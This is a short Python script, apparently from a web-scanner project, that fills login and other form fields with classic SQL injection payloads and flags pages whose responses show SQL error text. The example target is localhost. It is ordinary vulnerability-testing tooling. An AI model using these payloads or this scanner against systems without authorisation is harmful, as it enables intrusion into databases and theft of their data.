import requests
from urllib.parse import urlparse, urlencode

# Sample SQLi payloads
PAYLOADS = ["' OR '1'='1", "';--", "admin' --", "\" OR \"1\"=\"1"]

def test_sql_injection(url, forms):
    vulnerable = []
    for form in forms:
        action = form.get('action') or url
        method = (form.get('method') or 'get').lower()
        data = {}
        for inp in form.get('inputs', []):
            name = inp.get('name')
            if name:
                data[name] = PAYLOADS[0]  # use first sample payload

        target_url = action if action.startswith("http") else url
        try:
            if method == 'post':
                r = requests.post(target_url, data=data, timeout=8)
            else:
                r = requests.get(target_url, params=data, timeout=8)
            if "sql" in r.text.lower() or "syntax" in r.text.lower() or "mysql" in r.text.lower():
                vulnerable.append(target_url)
        except Exception as e:
            print(f"Error testing {target_url}:", e)
    return vulnerable

if __name__ == "__main__":
    # Example forms discovered (replace with your crawler output)
    test_forms = [
        {'action': 'http://localhost/webscanpro/login.php', 'method': 'post', 'inputs': [{'name': 'username'}, {'name': 'password'}]}
    ]

    endpoints = ['http://localhost/webscanpro/login.php']
    for url in endpoints:
        vulns = test_sql_injection(url, test_forms)
        if vulns:
            print("[!] SQL Injection Vulnerability Found at:", vulns)
        else:
            print("[+] No obvious SQLi vulnerability found for", url)
